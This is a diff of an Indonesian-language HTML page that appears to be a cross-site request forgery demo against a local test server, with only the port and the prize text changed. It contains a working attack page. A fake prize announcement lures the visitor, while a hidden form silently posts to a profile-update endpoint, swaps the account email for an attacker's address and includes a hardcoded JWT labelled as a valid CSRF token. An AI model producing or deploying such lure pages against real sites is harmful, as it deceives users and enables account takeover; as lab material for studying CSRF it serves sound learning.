@@ -146,11 +146,11 @@
     <div id="csrfForm">
       <h3 class="text-center mb-3">Kamu Mendapatkan Hadiah!</h3>
       <div class="toggle-section">Selamat Sofyan Taurid Ode Madi,
-        Kamu mendapatkan Hadiah Mac Studio dan GeForce RTX 5080,
+        Kamu mendapatkan Hadiah Mac Studio M4 MAX dan GeForce RTX 5080,
         Claim hadiah sekarang dengan menekan tombol dibawah sekarang juga!</div>
 
       <!-- Form otomatis yang langsung mengubah email -->
-      <form id="form-control" action="http://localhost:3000/api/update-profile" method="POST">
+      <form id="form-control" action="http://localhost:3443/api/update-profile" method="POST">
         <input type="hidden" name="email" value="kiki@gmail.com"> <!-- Menganti secara diam diam -->
         <input type="hidden" name="csrfToken" value="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJzdG9tIiwiaWF0IjoxNzQyMzE0NDQwLCJleHAiOjE3NDIzMTgwNDB9.Vu6FbacQ18aYugPUwE2ddWpF83C5XkbwtocBUpSirXg"> <!-- Token CSRF yang valid -->
 
@@ -179,7 +179,7 @@
       // Menghapus token login atau data session untuk logout
       localStorage.removeItem('token');
       // Redirect ke halaman login setelah logout
-      window.location.href = 'localhost:3000/auth.html';
+      window.location.href = 'localhost:3443/auth.html';
     }
   </script>
 
